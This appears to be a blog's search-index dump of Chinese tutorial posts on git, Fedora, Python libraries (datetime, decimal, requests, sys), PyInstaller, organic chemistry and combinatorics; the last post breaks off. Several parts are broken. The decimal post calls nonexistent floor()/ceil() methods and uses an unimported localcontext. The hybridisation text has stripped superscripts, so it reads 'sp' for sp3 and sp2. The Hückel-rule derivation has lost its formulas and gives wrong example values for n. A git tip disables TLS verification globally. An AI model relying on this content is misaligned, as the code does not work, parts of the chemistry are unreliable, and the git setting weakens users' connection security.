gc\n\n常见问题解决SSL证书问题git config --global http.sslVerify false\n\n强制推送git push -f origin &lt;branch&gt;  # 谨慎使用，会覆盖远程分支\n\n最佳实践\n提交之前先pull\n经常commit，适时push\n分支开发，主干发布\n添加有意义的提交信息\n及时处理冲突\n\n","categories":["linux"],"tags":["linux","git"]},{"title":"Fedora删除旧内核","url":"/2022/12/15/linux/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6/","content":"从新的内核重启后，一条命令\nsudo dnf remove --oldinstallonly\n\nRemove command-specific options:  --duplicates          删除已安装（重复）的软件包  --oldinstallonly      移除过期的“仅安装”软件包\n","categories":["linux"],"tags":["linux","fedora"]},{"title":"py datetime库","url":"/2025/03/30/python/py-datetime/","content":"datetime 库简介datetime 是 Python 内置的日期和时间处理库，提供了处理日期和时间的类和函数。主要包含以下常用类：\n\ndatetime：同时包含日期和时间信息\ndate：仅包含日期信息\ntime：仅包含时间信息\ntimedelta：表示时间间隔\n\n基本用法1. 获取当前日期和时间from datetime import datetime# 获取当前日期和时间now = datetime.now()print(f&quot;当前时间：&#123;now&#125;&quot;)  # 输出格式如：2025-03-30 16:38:50.123456# 获取年、月、日、时、分、秒print(f&quot;年：&#123;now.year&#125;&quot;)print(f&quot;月：&#123;now.month&#125;&quot;)print(f&quot;日：&#123;now.day&#125;&quot;)print(f&quot;时：&#123;now.hour&#125;&quot;)print(f&quot;分：&#123;now.minute&#125;&quot;)print(f&quot;秒：&#123;now.second&#125;&quot;)\n\n2. 日期格式化from datetime import datetimenow = datetime.now()# 将日期转换为字符串date_str = now.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)print(f&quot;格式化日期：&#123;date_str&#125;&quot;)# 将字符串转换为日期date_obj = datetime.strptime(&quot;2025-03-30 16:38:50&quot;, &quot;%Y-%m-%d %H:%M:%S&quot;)print(f&quot;解析的日期：&#123;date_obj&#125;&quot;)\n\n3. 日期计算from datetime import datetime, timedeltanow = datetime.now()# 日期加减tomorrow = now + timedelta(days=1)yesterday = now - timedelta(days=1)next_hour = now + timedelta(hours=1)last_week = now - timedelta(weeks=1)print(f&quot;明天：&#123;tomorrow&#125;&quot;)print(f&quot;昨天：&#123;yesterday&#125;&quot;)print(f&quot;一小时后：&#123;next_hour&#125;&quot;)print(f&quot;上周：&#123;last_week&#125;&quot;)\n\n4. 时区处理from datetime import datetimeimport pytz# 创建时区对象tz_utc = pytz.UTCtz_cn = pytz.timezone(&#x27;Asia/Shanghai&#x27;)# 获取当前时区的时间cn_time = datetime.now(tz_cn)print(f&quot;中国时间：&#123;cn_time&#125;&quot;)# 时区转换utc_time = cn_time.astimezone(tz_utc)print(f&quot;UTC时间：&#123;utc_time&#125;&quot;)\n\n常用格式化符号\n\n\n符号\n含义\n\n\n\n%Y\n年份（如：2025）\n\n\n%m\n月份（01-12）\n\n\n%d\n日期（01-31）\n\n\n%H\n24小时制（00-23）\n\n\n%I\n12小时制（01-12）\n\n\n%M\n分钟（00-59）\n\n\n%S\n秒（00-59）\n\n\n%f\n微秒（000000-999999）\n\n\n%A\n星期几的完整名称\n\n\n%a\n星期几的简写\n\n\n%B\n月份名称\n\n\n%b\n月份简写\n\n\n注意事项\ndatetime 对象是不可变的（immutable）\n进行时区操作时需要安装 pytz 库：pip install pytz\n在处理时区时，建议始终使用 aware datetime（包含时区信息的datetime对象）\n在数据库操作中，建议统一使用 UTC 时间，展示时再转换为本地时间\n\n","categories":["python"],"tags":["datetime","py库"]},{"title":"py decimal库","url":"/2025/03/30/python/py-decimal/","content":"decimal 库简介decimal 是 Python 标准库中用于十进制浮点运算的模块，它提供了 Decimal 类来进行精确的十进制数学计算。与内置的 float 类型相比，Decimal 可以：\n\n精确控制精度\n正确处理小数计算\n消除浮点数计算中的精度误差\n\n基本用法1. 创建 Decimal 对象from decimal import Decimal# 基本创建方式d1 = Decimal(&#x27;0.1&#x27;)d2 = Decimal(&#x27;0.2&#x27;)print(f&quot;d1 + d2 = &#123;d1 + d2&#125;&quot;)  # 输出：0.3# 对比 floatf1 = 0.1f2 = 0.2print(f&quot;f1 + f2 = &#123;f1 + f2&#125;&quot;)  # 输出：0.30000000000000004\n\n2. 精度控制from decimal import Decimal, getcontext# 设置全局精度getcontext().prec = 4print(Decimal(&#x27;1&#x27;) / Decimal(&#x27;3&#x27;))  # 输出：0.3333# 临时改变精度with localcontext() as ctx:    ctx.prec = 2    print(Decimal(&#x27;1&#x27;) / Decimal(&#x27;3&#x27;))  # 输出：0.33\n\n3. 四舍五入from decimal import Decimal, ROUND_HALF_UP, ROUND_DOWNnum = Decimal(&#x27;3.14159&#x27;)# 四舍五入到指定位数print(num.quantize(Decimal(&#x27;0.01&#x27;), ROUND_HALF_UP))  # 输出：3.14print(num.quantize(Decimal(&#x27;0.1&#x27;), ROUND_HALF_UP))   # 输出：3.1# 向下取整print(num.quantize(Decimal(&#x27;0.01&#x27;), ROUND_DOWN))     # 输出：3.14\n\n4. 数学运算from decimal import Decimala = Decimal(&#x27;1.5&#x27;)b = Decimal(&#x27;2.5&#x27;)# 基本运算print(f&quot;加法：&#123;a + b&#125;&quot;)print(f&quot;减法：&#123;a - b&#125;&quot;)print(f&quot;乘法：&#123;a * b&#125;&quot;)print(f&quot;除法：&#123;a / b&#125;&quot;)# 取整和余数print(f&quot;向下取整：&#123;a.floor()&#125;&quot;)print(f&quot;向上取整：&#123;b.ceil()&#125;&quot;)print(f&quot;取余：&#123;a % b&#125;&quot;)\n\n常用方法和属性\n\n\n方法&#x2F;属性\n说明\n\n\n\nas_tuple()\n返回数值的元组表示\n\n\nquantize()\n设置小数位数\n\n\nnormalize()\n规范化表示\n\n\nis_finite()\n检查是否为有限数\n\n\nis_infinite()\n检查是否为无穷大\n\n\nis_nan()\n检查是否为 NaN\n\n\n注意事项\nDecimal 对象之间可以进行算术运算，但不能直接与 float 类型混合运算\n使用字符串初始化 Decimal 对象可以避免浮点数精度问题\n设置全局精度会影响所有后续的计算\n在金融计算等需要精确小数计算的场景中，应优先使用 Decimal\n\n使用场景\n金融计算\nfrom decimal import Decimalprice = Decimal(&#x27;19.99&#x27;)tax_rate = Decimal(&#x27;0.15&#x27;)quantity = Decimal(&#x27;3&#x27;)total = price * quantitytax = total * tax_ratefinal_price = total + taxprint(f&quot;总价：&#123;final_price&#125;&quot;)\n\n科学计算\nfrom decimal import Decimal, getcontextgetcontext().prec = 50  # 设置高精度pi = Decimal(&#x27;3.14159265358979323846264338327950288419716939937510&#x27;)radius = Decimal(&#x27;2.5&#x27;)area = pi * radius * radiusprint(f&quot;圆的面积：&#123;area&#125;&quot;)\n\n","categories":["python"],"tags":["py库","decimal"]},{"title":"py requests库","url":"/2024/11/30/python/py-requests/","content":"requests 库是 Python 中一个用于发送 HTTP 请求的第三方库。它提供了一个简单、直观的 API，使得发送 HTTP 请求和处理响应变得非常容易。以下是对 requests 库的详细介绍：\n一、简介requests 库旨在让 HTTP 请求变得简单。它基于 urllib3 库，但提供了更高级别的接口，使得开发者无需直接处理底层的套接字或连接池等细节。requests 库支持各种 HTTP 请求方法（如 GET、POST、PUT、DELETE 等），并允许自定义请求头、参数、超时设置等。\n二、安装requests 库可以通过 Python 的包管理器 pip 进行安装。在命令行中运行以下命令即可：\npip install requests\n\n三、主要功能\n发送 HTTP 请求：\n\nrequests.get(url, **kwargs)：发送 GET 请求。\nrequests.post(url, data=None, json=None, **kwargs)：发送 POST 请求，可以传递表单数据或 JSON 数据。\nrequests.put(url, data=None, **kwargs)：发送 PUT 请求，用于更新资源。\nrequests.delete(url, **kwargs)：发送 DELETE 请求，用于删除资源。\n其他 HTTP 方法（如 HEAD、OPTIONS）也有相应的函数。\n\n\n处理响应：\n\n响应对象包含了许多有用的方法和属性，如 status_code（状态码）、headers（响应头）、text（响应体，解码后的字符串）、content（响应体，原始的字节流）等。\n可以使用 response.json() 方法将 JSON 格式的响应体解析为 Python 字典。\n\n\n自定义请求：\n\n可以使用 params 参数传递 URL 查询参数。\n可以使用 headers 参数自定义请求头。\n可以使用 cookies 参数传递 cookies。\n可以使用 auth 参数进行身份认证。\n可以使用 timeout 参数设置请求超时时间。\n可以使用 proxies 参数设置代理服务器。\n\n\n会话对象：\n\n使用 requests.Session() 可以创建一个会话对象，用于保持某些参数（如 cookies 和 headers）的一致性，并在同一会话中发送多个请求。\n\n\n异常处理：\n\nrequests 库提供了异常处理机制，可以捕获如 requests.exceptions.RequestException、requests.exceptions.HTTPError、requests.exceptions.ConnectionError 等异常。\n\n\n\n四、优点\n简单易用：requests 库的 API 设计简洁明了，使得发送 HTTP 请求和处理响应变得非常容易。\n功能强大：支持各种 HTTP 请求方法、自定义请求头、参数、超时设置等高级功能。\n自动处理 cookies：会话对象可以自动处理 cookies，使得在同一会话中发送多个请求时无需手动管理 cookies。\n异常处理：提供了丰富的异常处理机制，方便开发者捕获和处理各种网络请求异常。\n\n五、示例以下是一个简单的示例，展示了如何使用 requests 库发送 GET 请求并处理响应：\nimport requests# 发送 GET 请求response = requests.get(&#x27;https://api.example.com/data&#x27;)# 检查状态码if response.status_code == 200:    # 获取响应体并解码为字符串    data = response.text    # 或者使用 response.json() 方法解析 JSON 格式的响应体    # data = response.json()    # 处理数据...else:    # 处理错误状态码...    print(&#x27;Error:&#x27;, response.status_code)","categories":["python"],"tags":["py库","requests"]},{"title":"py sys库","url":"/2024/11/30/python/py-sys/","content":"导入 sys 模块要使用 sys 模块中的功能，首先需要导入它：\nimport sys\n\n常用功能1. 访问命令行参数sys.argv 是一个列表，包含了命令行参数。sys.argv[0] 是脚本的名称，sys.argv[1:] 是传递给脚本的参数。\nimport sysprint(&quot;Script name:&quot;, sys.argv[0])for i, arg in enumerate(sys.argv[1:], start=1):    print(f&quot;Argument &#123;i&#125;: &#123;arg&#125;&quot;)\n\n如果你运行 python script.py arg1 arg2，输出将会是：\nScript name: script.pyArgument 1: arg1Argument 2: arg2\n\n2. 标准输入输出和错误sys 模块提供了三个与标准流相关的变量：sys.stdin（标准输入）、sys.stdout（标准输出）和 sys.stderr（标准错误）。你可以重定向这些流或者替换它们。\n例如，将标准输出重定向到一个文件：\nimport syswith open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as f:    sys.stdout = f    print(&quot;This will be written to output.txt&quot;)    sys.stdout = sys.__stdout__  # 恢复原来的标准输出\n\n3. 退出程序sys.exit([arg]) 函数用于退出当前程序。如果提供了一个参数，则会被作为程序的退出状态码（0 表示成功，非0 表示失败）。\nimport sysif some_error_condition:    sys.exit(1)  # 非零值表示错误else:    sys.exit(0)  # 零值表示成功\n\n你也可以直接调用 sys.exit() 而不带参数，这等价于 sys.exit(0)。\n4. 最大递归深度sys.setrecursionlimit(limit) 函数允许你设置 Python 解释器的最大递归深度。默认深度通常是 1000，但这个值可以根据需要进行调整。不过，增加递归深度可能会导致栈溢出错误。\nimport sys# 设置最大递归深度为 2000sys.setrecursionlimit(2000)\n\n5. Python 版本信息sys.version 和 sys.version_info 提供了关于 Python 解释器版本的信息。sys.version 是一个字符串，而 sys.version_info 是一个命名元组，提供了更结构化的访问方式。\nimport sysprint(&quot;Python version (string):&quot;, sys.version)print(&quot;Python version (info):&quot;, sys.version_info)\n\n其他功能\nsys.path：一个列表，包含了模块搜索路径的字符串。你可以通过修改这个列表来影响模块的导入行为。\nsys.modules：一个字典，包含了所有已导入的模块。键是模块名，值是模块对象。\nsys.platform：一个字符串，表示运行 Python 解释器的操作系统平台。\nsys.getsizeof(object)：返回对象所占用的内存大小（以字节为单位），不包括对象引用的其他对象。\nsys.settrace(tracefunc) 和 sys.gettrace()：用于设置或获取全局跟踪函数，这通常用于调试目的。\n\n","categories":["python"],"tags":["py库","sys"]},{"title":"快速上手pyinstaller","url":"/2024/11/30/python/pyinstaller/","content":"\n1. PyInstaller 安装首先安装 PyInstaller：\npip install pyinstaller\n验证安装是否成功：\npyinstaller --version\n\n\n2. 基本用法打包单个脚本pyinstaller your_script.py\n\n生成的文件会放在 dist/your_script/ 目录下，包含可执行文件和依赖的多个文件。\n\n打包为单个可执行文件pyinstaller --onefile your_script.py\n\n--onefile 将所有依赖和代码合并为一个独立的可执行文件。\n\n\n3. PyInstaller 常用选项以下是常用选项的功能和用法：\n1. 添加图标pyinstaller --onefile --icon=your_icon.ico your_script.py\n\n**--icon**：指定 .ico 图标文件，适用于 Windows。\n\n\n2. 隐藏终端窗口pyinstaller --onefile --noconsole your_script.py\n\n**--noconsole**：适用于 GUI 程序，隐藏终端窗口（仅在 Windows 中有效）。\n\n\n3. 指定额外依赖路径pyinstaller --onefile --paths=/path/to/extra/modules your_script.py\n\n**--paths**：用于包含 Python 脚本未在标准路径下的模块或包。\n\n\n4. 处理隐藏导入某些模块（如动态导入的模块）可能无法被自动检测到，需要手动指定：\npyinstaller --hidden-import=module_name your_script.py\n\n**--hidden-import**：解决未检测的依赖模块。\n\n\n5. 压缩可执行文件如果可执行文件体积较大，可以使用 UPX 压缩：\n\n安装 UPX。\n使用以下命令：pyinstaller --onefile --upx-dir=/path/to/upx your_script.py\n\n\n6. 调试模式在打包时开启调试模式以查看详细错误信息：\npyinstaller --debug=all your_script.py\n\n\n7. 指定工作目录为避免污染当前目录，可以指定工作目录：\npyinstaller --workpath=/path/to/workdir your_script.py\n\n**--workpath**：指定临时文件的存放目录。\n\n\n4. 打包结果文件说明\n**dist/**：生成的可执行文件和相关资源。\n**build/**：构建过程中产生的临时文件。\n.spec 文件：PyInstaller 的配置文件，可手动修改以支持更复杂的需求。\n\n\n5. 使用 .spec 文件生成 .spec 文件在第一次运行 PyInstaller 时会自动生成 .spec 文件：\npyinstaller your_script.py\n或手动创建：\npyinstaller --onefile --icon=your_icon.ico your_script.py\n\n编辑 .spec 文件你可以修改 .spec 文件来配置：\n\n数据文件（如图片、配置文件）：datas=[(&#x27;path/to/datafile&#x27;, &#x27;destination_folder&#x27;)]\n隐藏导入：hiddenimports=[&#x27;module1&#x27;, &#x27;module2&#x27;]\n\n使用 .spec 文件重新打包pyinstaller your_script.spec\n\n\n6. 示例应用场景简单脚本打包假设有一个脚本 hello.py：\nprint(&quot;Hello, PyInstaller!&quot;)\n运行以下命令：\npyinstaller --onefile hello.py\n生成的可执行文件位于 dist/hello.exe。\n\n打包 GUI 程序对于 Tkinter 或 PyQt5 程序，示例脚本 gui_app.py：\nfrom tkinter import Tk, Labelroot = Tk()Label(root, text=&quot;Hello, GUI!&quot;).pack()root.mainloop()\n运行命令：\npyinstaller --onefile --noconsole --icon=app_icon.ico gui_app.py\n\n\n包含数据文件如果脚本依赖额外的数据文件：\n# example.pyimport ospath = os.path.join(os.path.dirname(__file__), &#x27;config.txt&#x27;)with open(path) as f:    print(f.read())\n命令：\npyinstaller --onefile --add-data &quot;config.txt;.&quot; example.py\n\n**--add-data**：格式为 文件路径;目标目录。\n\n\n7. 常见问题与解决\n运行时缺失模块\n\n检查日志，使用 --hidden-import 添加缺失模块。\n\n\n文件过大\n\n启用 UPX 压缩。\n检查是否有多余的依赖包。\n\n\n路径问题\n\n使用 sys._MEIPASS 获取运行时的临时路径：import sys, ospath = os.path.join(sys._MEIPASS, &#x27;config.txt&#x27;)\n\n\n\n\n8. 完整命令模板综合多个参数的完整示例：\npyinstaller --onefile --noconsole --icon=app_icon.ico --add-data &quot;config.txt;.&quot; --hidden-import=pkg_resources.py2_warn --debug=all gui_app.py\n\n\n","categories":["python"],"tags":["python打包","pyinstaller"]},{"title":"马氏规则","url":"/2022/12/17/%E5%8C%96%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6/","content":"马氏规则规定：在烯烃的亲电加成反应中,加成试剂的正性基团将加到烯烃双键 ( 或叁键 )带取代基较少 (或含氢较多 )的碳原子上 .它阐明了在加成试剂与烯烃发生反应中,如可能产生两种异构体时,为何往往只产生其中的一种.\n反马氏规则指：不对称烯烃与卤化氢等亲电试剂发生加成反应的取向与按马氏规则预测的取向不一致时,称为反马尔可夫尼可夫规则.反马氏规则的情况大致有两种：(1)在光及过氧化物作用下,发生了游离基加成反应(参见过氧化物效应)；(2)当亲电试剂中氢原子的电负性大于所连的原子或原子团时,从形式上看加成的取向是违反马氏定则的.（3）三氟乙烯和氯化氢加成违反马氏定则.（4）烯与次卤酸加成是反马氏规则!\n","categories":["化学"],"tags":["有机化学"]},{"title":"诱导效应和共轭效应","url":"/2022/11/30/%E5%8C%96%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B62/","content":"诱导效应和共轭效应在有机化合物分子中，由于电负性不同的取代基（原子或原子团）的影响，使整个分子中的成键电子云密度向某一方向偏移，使分子发生极化的效应，叫诱导效应。共轭效应 (conjugated effect) ，又称离域效应，是指共轭体系中由于原子间的相互影响而使体系内的π电子（或p电子）分布发生变化的一种电子效应。\n由极性键所表现出的诱导效应称做静态诱导效应，而在化学反应过程中由于外电场（如试剂、溶剂）的影响所产生的极化键所表现出的诱导效应称做动态诱导效应。诱导效应只改变键内电子云密度分布，而不改变键的本性。且与共轭效应相比，无极性交替现象。\n凡共轭体系上的取代基能降低体系的π电子云密度，则这些基团有吸电子共轭效应，用-C表示，如-COOH，-CHO，-COR；凡共轭体系上的取代基能增高共轭体系的π电子云密度，则这些基团有给电子共轭效应，用+C表示，如-NH2，-R、-OH。\n","categories":["化学"],"tags":["有机化学"]},{"title":"价键理论","url":"/2023/01/10/%E5%8C%96%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B63/","content":"原子轨道原子由原子核和电子组成，原子和居中心，占空间较小，核外电子运动服从量子力学中用能量束描述的波动方程式，其运动状态就叫原子轨道，可以用波函数来表示。由量子力学测不准原则可知，不可能同时准确定测定一个电子的位置和能量，只能知道电子在某一位置或具有某种速度(即能量)的几率，该几率与φ2成正比；电子出现几率最大的地方好比一块“电子云”，电子云的形状和大小也就是原子轨道的形状和大小，不同能量的电子占据不同能量、不同形状和大小的原子轨道。原子核外电子的分布遵循以下三条原则：①电子要尽可能占据能量最低的轨道，即能量最低原理；②每个轨道上不能容纳两个完全相同的电子，如成对的电子处在同一轨道上时，它们的自旋方向只能是相反的，此原理称为Pauli不相容原理；③如有能量相同的几个轨道，电子将尽可能分别占据不同的轨道，且它们的自旋方向相同，或称自旋平行，此原理称为Hund原理。原子核外电子是分层分能级填充排布的。其中具有电子完全充满各电子层轨道的电子构型式是稳定的，否则是不稳定的。\n共价键(1 )共价键的形成价键的形成是原子轨道的重叠或电子配对的结果，如果两个原子都有未成键电子，并且自旋方向相反，就能配对形成共价键。(2) 成键的基本要点A 、键电子自旋方向必需相反如果两个原子各有一个未成对的电子，并且自旋方向相反，其原子轨道就可重叠形成一个共价键。例如，两个氢原子的1s轨道互相重叠生成氢分子。B 、价键的饱和性在形成共价键时，一个原子有几个未成对电子，它就可以和几个自旋方向相反的电子配对成键，不再与多于它的未成对电子配对。这就是共价键的饱和性。C 、价键的方向性成键时，两个电子的原子的轨道发生重叠，而P电子的原子轨道具有一定的空间取向，只有当它从某一方向互相接近时才能使原子轨道得到最大的重叠，生成的分子的能量得到最大程度的降低，才能形成稳定的反之。\n杂化原子成键时并非总是以基态原子轨道交叠的，价键理论承认基态原子轨道是可以杂化的，参与杂化的原子轨道应当是能量相同或相近的，重新生成的杂化轨道具有与参与杂化的原子轨道相同或相近的能量，但形状变异。例如碳原子轨道的杂化有三种形式：sp杂化 由一个2s轨道和三个2p轨道杂化形成四个能量相等的新轨道，叫做sp杂化轨道，这种杂化方式叫做sp杂化。sp杂化轨道的形状及能量既不同于2s轨道，又不同于2p轨道，它含有1/4的s成分和3/4的p成分。sp杂化轨道是有方向性的，即在对称轴的一个方向上集中，四个sp杂化轨道呈四面体分布，轨道对称轴之间的夹角均为109°28’。sp杂化 由一个2s轨道和两个2p轨道重新组合成三个能量等同的杂化轨道，称sp杂化。sp杂化轨道的形状与sp杂化轨道相似，sp杂化轨道含有1/3的s成分和2/3的p成分，这三个sp杂化轨道的对称轴在同一平面上，并以碳原子核为中心，分别指向正三角形的三个顶点，对称轴的夹角为120°。碳原子还余下一个未参与杂化的2p轨道，仍保持原来的形状，它的对称轴垂直于三个sp杂化轨道对称轴所在的平面。sp杂化 由一个2s轨道和一个2p轨道重新组合成二个能量等同、方向相反的杂化轨道，称sp杂化。\n共轭近代价键理论承认一个原子的原子轨道(基态的或杂化态的)可以不止与一个原子轨道交叠，即共轭；换言之，成键电子不再定于在两个成键原子之间，而是可以出现在轨道交叠的整个区域，即电子可以离域。能发生电子离域的体系叫共轭体系。共轭体系的主要类型有：①π-π共轭；②p-π共轭；③σ-π超共轭；④σ-p超共轭。要求熟悉各种共轭体系的形成过程，熟悉各类分子中存在的共轭体系。例如：丁二烯、苯及稠环烃、羧酸、丙烯、苯酚、正碳离子、负碳离子。共振论共振论是描述化学键的一种方法，由于共振论是从经典的价键构造式出发，用化学工作者所熟悉的语言和经典的结构要素提供了某些能被化学家直接应用的直观模型，并把量子力学的共振概念作为价键理论的补充和延伸，因此，共振论属于价键理论的范畴。共振论的要点：①何谓共振论；②如何写出共振式；③如何评价极限式的贡献和其极限杂化体的稳定性。共振论可以用于描述分子结构，也可以用于分子的酸碱性强弱，偶极矩和键长的大小，光谱特性，反应条件，产物分布及相对稳定性，解释反应机理，预测反应等。叠加共振实际包含价键电子的离域及键长键能的变化等概念在内。因此，与经典价键理论相比更能反映分子的真实结构，更能说明分子的物理化学性质。\n","categories":["化学"],"tags":["有机化学"]},{"title":"休克尔规则","url":"/2023/01/10/%E5%8C%96%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B64/","content":"休克尔规则概述休克尔规则（Hückel’s rule）是一个经验规则，用以判断具有共轭烯烃结构的环状有机化合物是否具有芳香性。这套规则简述为（4n+2），即如果参与构成共轭 π 电子的个数为 4n+2 个，其中 n 为自然数（如 2, 6, 10, 14 等），则此化合物就具有芳香性；反之，则不具有芳香性。\n休克尔规则可以解释苯、茂基负离子、环丙烯正离子、环庚三烯正离子等有机物的芳香性，以及为何环丁二烯、环辛四烯不具有芳香性。\n休克尔规则由德国化学家埃里希·休克尔（Erich Hückel）于 1931 年提出。限定条件\n可以应用休克尔规则的分子需要遵循以下两个限定条件：\n\n分子为单环，且环公平面；\n在环内的所有骨架原子均存在与环状骨架平面垂直的 p 轨道。对碳原子来说，这意味着 sp2 杂化。\n\n原理休克尔规则可以通过简化的分子轨道（MO）理论模型来解释。\n首先，假设体系内共有n个骨架原子，每个原子贡献一个垂直于环状平面的 p 轨道。这些 p 轨道就构成了环状平面内共轭 π 键分子轨道的一组「标准正交基」。注意不要把骨架原子个数（大写 N）和休克尔规则中的自然数（小写 n）混淆。因此，共轭 π 键可以写成 p 轨道的线性组合，即标准正交基的含义为 p 轨道自身在全空间的积分其中为克罗内克记号。\n其次，某个骨架原子的 p 轨道只与相邻的 p 轨道存在一部分重叠。因此，我们可以把矩阵元简化并记为自身即相邻其他这样，就剩下两个不同的积分：和。整个体系的哈密顿量即可表达为由和构成的矩阵。如苯的哈密顿量就可以写成：这个矩阵的规律是：\n矩阵的大小是，即体系中的 p 轨道数，也即骨架原子数 N 。6 元环就是 66 矩阵，3 元环就是 33 矩阵。矩阵的主对角元均为。这对于任何哈密顿量均成立。在的两边，各有一个。这就是我们假设的相邻 p 轨道之间有重叠。在第一行和最后一行，因为的位置顶到头了，有一个就出现在了另一边。这体现了环状分子，即和相邻。矩阵中的其余元素均为 0。这体现了假设：轨道只与相邻轨道发生作用。\n有了哈密顿量之后，将矩阵对角化就能够得到一组特征值和特征向量。特征向量即为分子轨道，特征值即为分子轨道对应的能量。\n计算结果为 N 个能量其中为偶数为奇数根据三角函数的性质，可以把这一组能量画在一个圆形上。如 N=5 和 N=6 的情况如下图所示：\n 每一个能量对应一个轨道，里面可以填充自旋相反的一对电子。的轨道能量要比原本未组成分子轨道前的 p 轨道的能量要低。\n如果一个共轭 π 体系中的电子都成对地填充满的轨道中，它就具有芳香性——一种比单纯的双键能量更低、更稳定的结构。但如果体系中还有电子填充在的轨道中，则不具有芳香性。\n休克尔规则如何在分子轨道理论中体现呢？考虑具有 N 个骨架原子的共轭体系。如果它是中性分子，电子数即为；如果它是正离子，电子数即为；如果它是负离子，电子数即为。\n对中性分子，骨架和电子数都为，且为偶数（电子要成对），故 N\\mod 4=0,,,2 。如果，则有个轨道能量低于 \\alpha ，共能填充 4(n-1)+2=4n-2 个电子，比体系的电子数要少。如果，则有个轨道能量低于，正好共能填充个电子。\n对正、负离子来说类似。正离子，可令或。这时，两种情况都需要 4n+2 个电子来填充能量低于 \\alpha 的轨道，因此 N-1=4n 的情况电子没填满，故没有芳香性。对负离子，可令或。若，则能量低于 \\alpha 的轨道可填充 4n-2 个电子；如果 N=4n+1 ，则能量低于的轨道可填充个电子。因此，的情况电子数超出了允许值，故没有芳香性。\n综上可见，只有的分子才有芳香性，这就是休克尔规则中的来源\n","categories":["化学"],"tags":["有机化学"]},{"title":"有机反应类型","url":"/2023/01/28/%E5%8C%96%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B65/","content":"最近发现有机反应类型掌握不牢，重新研究了一下。参考资料：百度百科知乎 \n游离基反应（自由基型反应）：自由基反应又称游离基反应，是自由基参与的各种化学反应。按共价键均裂方式进行的有机反应称为自由基反应。 [1]  自由基电子壳层的外层有一个不成对的电子，对增加第二个电子有很强的亲和力，故能起强氧化剂的作用。大气中较重要的为OH-自由基，能与各种微量气体发生反应。在光化学烟雾形成的化学反应中，有许多自由基反应，在链反应中起了重要的引发、传递和终止过程的作用。有许多自由基是中间产物，如过氧化氢自由基（HO2-）、烷氧基自由基（RO-）、过氧烷基自由基（RO2-）、酰基自由基（RCO-）等。自由基反应通常在高温、光照或过氧化物存在下进行。\n均裂均裂：A：B → A· ＋ B·\n即构成共价键的电子对在断裂时平均分配到两个原子 上，形成带有单电子的活泼原子或基团——游离基（又叫 自由基），这种断裂方式称为共价键的均裂。\n由于分子经过均裂产生自由基而引发的反 应称为自由基型反应。自由基型反应分链引发、链转移和 链终止三个阶段。\n链引发阶段：是产生自由基的阶段。由于键的均裂需要能量，所以链 引发阶段需要加热或光照。链转移阶段：是由一个自由基转变成另一个自由基的阶段，犹如接力 赛一样，自由基不断地传递下去，像一环接一环的链，所以称之为链反应。链终止阶段：是消失自由基的阶段，自由基两两结合成键，所有的自 由基都消失了，自由基反应也就终止了。\n自由基反应自由基取代：烷烃卤代、芳烃侧链卤代、烯烃α-H卤代自由基反应自由基加成：烯烃的过氧化效应，部分聚合反应\n离子型反应用烃基或酰基取代有机分子中的氢原子、卤原子或有机金属化合物中的金属原子\n异裂异裂：A：B → A- ＋ B+（或A+ ＋ B-）\n即构成共价键的电子对在断裂时完全转移到1个 原子上，形成正离子和负离子，这种断裂方式称为共 价键的异裂。\n由分子经过异裂生成离子而引发的反应称为离子型反应。 离子型反应有亲核反应和亲电反应。由亲核试剂进攻而发生的反应称为亲核反应，亲核试剂是对正原子核有显著亲和力而起反应的试剂。由亲电试剂进攻而发生的反应称为亲电反应。亲电试剂是对电子有显著亲合力而起反应的试剂。\n离子型反应亲电加成：烯、炔、二烯烃的加成亲电取代：芳环上的取代反应亲核加成：醛、酮的亲核加成、羟醛缩合反应亲核取代：卤代烃、醇的SN1反应消除反应：卤代烃和醇的E1反应亲核加成—消除反应：羧酸衍生物的代表反应协同反应（反应连续进行，一步完成）：双烯合成、SN2、 E2反应\n\n反应物和试剂及试剂的分类1．反应物和试剂\n反应物(或作用物)和试剂之间并没有十分严格的界限，是个相对的概念、习惯用语。本来相互作用的两种物质，即可互为反应物，也可互为试剂。但为了讨论和研究问题时方便，从经验中人为的规定反应中的一种有机物为反应物，无机物或另一种有机物为试剂。例如：\n乙烯与溴的加成反应，乙烯为反应物，溴为试剂。苯肼与醛、酮的反应，醛、酮为反应物，苯肼为试剂。2．试剂的分类\n有机反应中的试剂(无机试剂和有机试剂) 按有机反应历程可分为极性(或离子型)试剂和非极性(自由基)试剂两大基本类型。非极性试剂是指自由基或容易产生自由基的化合物，极性试剂是指含偶数电子的正、负离子或极性分子。\n试剂：\n极性(或离子型)试剂：含偶数电子的正、负离子或极性分子非极性(自由基)试剂：自由基或容易产生自由基的化合物从试剂的电子结构来看，极性试剂是指那些能够接受和供给一对电子以形成共价键的试剂。因此，极性试剂又分为两类，在离子型反应中供给一对电子与反应物生成共 价键的试剂叫做亲核试剂，而从反应物接受一对电子生共价键的试剂叫做亲电试剂。\n极性试剂：\n亲核试剂：供给一对电子与反应物生成共价键的试剂亲电试剂：从反应物接受一对电子生共价键的试剂从广义的酸、碱概念的角度上来说，路易斯碱都是亲核的， 故为亲核试剂；而路易斯酸都是亲电的，则为亲电试剂\n离子型反应\n亲核反应：由亲核试剂进攻反应物而引起的反应称为亲核反应。亲电反应：由亲电试剂进攻而引起的反应，叫做亲电反应。\n亲核反应又可进一步分为亲核取代反应和亲核加成反应。亲电反应分为亲电取代反应和亲电加成反应。\n","categories":["化学"],"tags":["有机化学"]},{"title":"排列组合超级神奇的技巧","url":"/2023/04/29/%E6%95%B0%E5%AD%A6/%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88%E8%B6%85%E7%BA%A7%E7%A5%9E%E5%A5%87%E7%9A%84%E6%8A%80%E5%B7%A7/","content":"N个相同元素分为M堆，每堆至少x个，可以分为）例：\n\n该方程的正整数解有多少种？非负整数解又有多少种？我们可以理解为有10个相同的11 1 1 1 1 1 1 1 1 1 